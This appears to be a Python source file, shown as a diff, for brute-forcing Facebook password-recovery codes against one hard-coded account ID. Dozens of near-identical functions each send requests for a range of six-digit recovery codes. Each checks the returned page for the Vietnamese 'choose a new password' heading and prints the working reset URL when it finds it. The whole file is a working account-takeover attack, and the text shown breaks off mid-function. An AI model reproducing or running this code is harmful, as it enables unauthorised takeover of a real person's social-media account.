@@ -1,0 +1,3510 @@
+import multiprocessing,requests,os
+from bs4 import BeautifulSoup
+id_account=('100002923342594')
+os.system("cls")
+def task_a():
+    a=b=c=d=e=f=0
+    for f in range (0,10000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b():
+    a=0
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (10000,20000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f():
+    a=0
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (20000,30000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c():
+    a=0
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (30000,40000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d():
+    a=0
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (40000,50000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e():
+    a=0
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (50000,60000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g():
+    a=0
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (60000,70000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h():
+    a=0
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (70000,80000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k():
+    a=0
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (80000,90000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_j():
+    a=0
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (90000,100000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a1():
+    a=1
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (100000,110000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b1():
+    a=1
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (110000,120000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f1():
+    a=1
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (120000,130000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c1():
+    a=1
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (130000,140000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d1():
+    a=1
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (140000,150000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e1():
+    a=1
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (150000,160000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g1():
+    a=1
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (160000,170000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h1():
+    a=1
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (170000,180000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k1():
+    a=1
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (180000,190000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j1():
+    a=1
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (190000,200000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a2():
+    a=2
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (200000,210000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b2():
+    a=2
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (210000,220000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f2():
+    a=2
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (220000,230000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c2():
+    a=2
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (230000,240000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d2():
+    a=2
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (240000,250000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e2():
+    a=2
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (250000,260000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g2():
+    a=2
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (260000,270000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h2():
+    a=2
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (270000,280000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k2():
+    a=2
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (280000,290000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j2():
+    a=2
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (290000,300000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a3():
+    a=3
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (300000,310000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b3():
+    a=3
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (310000,320000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f3():
+    a=3
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (320000,330000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c3():
+    a=3
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (330000,340000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d3():
+    a=3
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (340000,350000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e3():
+    a=3
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (350000,360000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g3():
+    a=3
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (360000,370000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h3():
+    a=3
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (370000,380000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
